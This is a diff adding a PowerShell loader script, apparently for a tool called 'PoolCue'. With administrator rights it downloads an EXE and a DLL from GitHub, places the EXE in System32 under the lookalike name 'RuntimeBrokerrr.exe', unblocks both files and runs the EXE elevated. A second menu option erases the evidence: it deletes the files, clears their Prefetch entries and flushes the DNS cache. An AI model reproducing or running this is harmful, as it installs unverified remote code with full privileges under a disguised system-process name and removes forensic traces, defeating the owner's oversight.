@@ -1,0 +1,96 @@
+cls
+# ตั้งค่าขนาดหน้าต่างให้พอดี
+$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(70,12)
+$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(70,12)
+
+Write-Host ""
+Write-Host " Authorization System | Protected By 1.st" -ForegroundColor Red
+Write-Host " ---------------------------------------" -ForegroundColor Gray
+
+Write-Host ""
+Write-Host "  [1] Install & Run" -ForegroundColor White
+Write-Host "  [2] Deep Clean (Remove All Trace)" -ForegroundColor White
+
+Write-Host ""
+$choice = Read-Host " > Enter Choice (1/2)"
+cls
+
+# เช็คสิทธิ์ Administrator
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "`n [!] Please Run As Administrator..." -ForegroundColor Red
+    exit
+}
+
+# กำหนดเส้นทางไฟล์
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
+$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
+$tempFilePath = Join-Path $env:TEMP "seanual_temp.exe"
+
+$exeUrl = "https://raw.githubusercontent.com/insomniazenn/PoolCue/main/PoolCuee.exe"
+$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
+
+if ($choice -eq "1") {
+    Write-Host "`n [>] Starting Installation..." -ForegroundColor Cyan
+
+    try {
+        # 1. โหลด DLL
+        Write-Host " [+] Downloading PoolCue.dll..." -ForegroundColor White
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination -ErrorAction Stop
+        
+        # 2. โหลด EXE ไปพักที่ Temp ก่อนย้าย
+        Write-Host " [+] Downloading Executable..." -ForegroundColor White
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFilePath -ErrorAction Stop
+        Move-Item -Path $tempFilePath -Destination $exeDestination -Force -ErrorAction Stop
+        
+        # 3. ปลดล็อคไฟล์เพื่อความเนียน
+        Unblock-File -Path $exeDestination
+        Unblock-File -Path $dllDestination
+        
+        Write-Host " [+] Starting Program..." -ForegroundColor White
+        Start-Sleep -Seconds 1
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "`n [SUCCESS] Installation Completed." -ForegroundColor Green
+    } catch {
+        Write-Host "`n [!] Failed: $_" -ForegroundColor Red
+    }
+}
+
+elseif ($choice -eq "2") {
+    Write-Host "`n [>] STARTING DEEP CLEANING..." -ForegroundColor Yellow
+    Write-Host " ---------------------------------------" -ForegroundColor Gray
+
+    # 1. ปิดโปรเซสที่เกี่ยวข้องทั้งหมด
+    Write-Host " [1/5] Stopping Processes..." -ForegroundColor White
+    $procs = @("RuntimeBrokerrr", "fontdrvhosts", "PoolCue")
+    foreach ($p in $procs) {
+        Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
+    }
+
+    # 2. ลบไฟล์หลักใน System32
+    Write-Host " [2/5] Removing System Files..." -ForegroundColor White
+    if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force -ErrorAction SilentlyContinue }
+    if (Test-Path $dllDestination) { Remove-Item $dllDestination -Force -ErrorAction SilentlyContinue }
+
+    # 3. ลบไฟล์ต้นฉบับในโฟลเดอร์ Temp (ลบโคนหลักฐาน)
+    Write-Host " [3/5] Cleaning Temporary Files..." -ForegroundColor White
+    if (Test-Path $tempFilePath) { Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue }
+
+    # 4. ลบประวัติการรันใน Windows Prefetch (ลบหลักฐานในระบบ)
+    Write-Host " [4/5] Clearing Windows Logs..." -ForegroundColor White
+    Get-ChildItem -Path "$env:windir\Prefetch\" -Filter "*RUNTIMEBROKERRR*" -ErrorAction SilentlyContinue | Remove-Item -Force
+    Get-ChildItem -Path "$env:windir\Prefetch\" -Filter "*POOLCUE*" -ErrorAction SilentlyContinue | Remove-Item -Force
+
+    # 5. ล้าง DNS Cache (ลบประวัติการดาวน์โหลดจากเว็บ)
+    Write-Host " [5/5] Flushing Network Cache..." -ForegroundColor White
+    Clear-DnsClientCache -ErrorAction SilentlyContinue
+
+    Write-Host "`n [SUCCESS] ALL TRACES REMOVED." -ForegroundColor Green
+}
+
+else {
+    Write-Host "`n [!] Invalid selection. Please choose 1 or 2." -ForegroundColor Red
+}
+
+Write-Host "`n Press Any Key Exit..."
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
